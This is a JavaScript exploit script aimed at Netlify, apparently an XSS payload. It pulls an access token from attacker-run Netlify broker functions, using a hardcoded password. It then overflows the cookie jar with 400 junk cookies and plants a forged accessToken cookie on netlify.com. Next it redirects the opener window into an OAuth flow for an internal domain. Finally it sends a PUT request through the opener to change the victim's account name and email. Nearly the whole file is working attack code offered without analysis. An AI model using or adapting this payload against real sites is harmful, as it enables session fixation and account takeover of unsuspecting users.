(async () => {
  const DASHBOARD_PASSWORD = "XSS-Runners-2026!7Kp4";

  const API_HOSTS = {
    custom:
      "https://interactive-custom-control-xss-20261015.netlify.app/.netlify/functions/oauth-broker",
    asset:
      "https://interactive-asset-source-xss-20261015.netlify.app/.netlify/functions/oauth-broker",
    chrome2:
      "https://owned-chrome2-wfui-xss-20261015.netlify.app/.netlify/functions/login-broker"
  };

  const basicAuth = `Basic ${btoa(`proof:${DASHBOARD_PASSWORD}`)}`;

  async function getSessionUrl(mode = "custom") {
    const endpoint = API_HOSTS[mode];

    if (!endpoint) {
      throw new Error(`Unknown mode: ${mode}`);
    }

    const response = await fetch(endpoint, {
      method: "POST",
      credentials: "include",
      cache: "no-store",
      headers: {
        "Content-Type": "application/json",
        Authorization: basicAuth
      },
      body: JSON.stringify({})
    });

    const responseText = await response.text();
    let data = {};

    try {
      data = responseText ? JSON.parse(responseText) : {};
    } catch {
      throw new Error(
        `Invalid broker response: HTTP ${response.status} ${responseText}`
      );
    }

    if (!response.ok || data.ok === false) {
      throw new Error(data.error || `HTTP ${response.status}`);
    }

    if (data.state !== "ready" || typeof data.loginUrl !== "string") {
      throw new Error("Broker did not return a ready login URL");
    }

    return new URL(data.loginUrl, window.location.href);
  }

  const sessionUrl = await getSessionUrl("chrome2");
  const hashParams = new URLSearchParams(sessionUrl.hash.slice(1));
  const token = hashParams.get("access_token");

  if (!token) {
    throw new Error("No access token found in the broker URL");
  }

  const isNetlifyDomain =
    window.location.hostname === "netlify.com" ||
    window.location.hostname.endsWith(".netlify.com");

  if (!isNetlifyDomain) {
    throw new Error(
      `Cannot set a netlify.com cookie from ${window.location.hostname}`
    );
  }

  const junkCookieOptions = "Path=/";
  let previousVisibleCount = -1;

  for (let i = 0; i < 400; i++) {
    document.cookie =
      `junk${i}=${"A".repeat(32)}; ${junkCookieOptions}`;

    const visibleCount = document.cookie
      ? document.cookie.split(/;\s*/).length
      : 0;

    if (visibleCount === previousVisibleCount) {
      break;
    }

    previousVisibleCount = visibleCount;
  }

  const cookieOptions = [
    "Path=/studio/6acfc3b2b4515ccf9f90a91b",
    "Domain=netlify.com",
    "Secure",
    "SameSite=None"
  ].join("; ");

  document.cookie =
    `accessToken=${encodeURIComponent(token)}; ${cookieOptions}`;

  const oauthUrl =
    "https://api.netlify.com/auth?provider=github&site_id=app.netlify.com&tracking_session_id=aade9842-b8db-45b9-92a4-bd807ffdade1&login=true&redirect=https%3A%2F%2Fapp.netlify.com%2Fedge-access%3Fdomain%3Dinternal.netlify.com%26requested_path%3D%252F%26site_id%3D947876e2-b71a-4ce5-88c3-6a4040d6a0b1%26strict_saml%3Dtrue&use_redirect=true";

  if (window.opener && !window.opener.closed) {
    window.opener.location = oauthUrl;
    
(async()=>{const o=window.opener;if(o.document.readyState!=="complete")await new Promise(r=>o.addEventListener("load",r,{once:true}));return o.fetch("https://app.netlify.com/access-control/bb-api/api/v1/user",{method:"PUT",headers:{"content-type":"application/json"},credentials:"include",body:JSON.stringify({full_name:"hamid hamdad",email:new URLSearchParams(location.search).get("email"),preferred_account_id:""})})})()
  } else {
    window.location.assign(oauthUrl);
  }
})().catch((error) => {
  console.error("Launcher failed:", error);
});

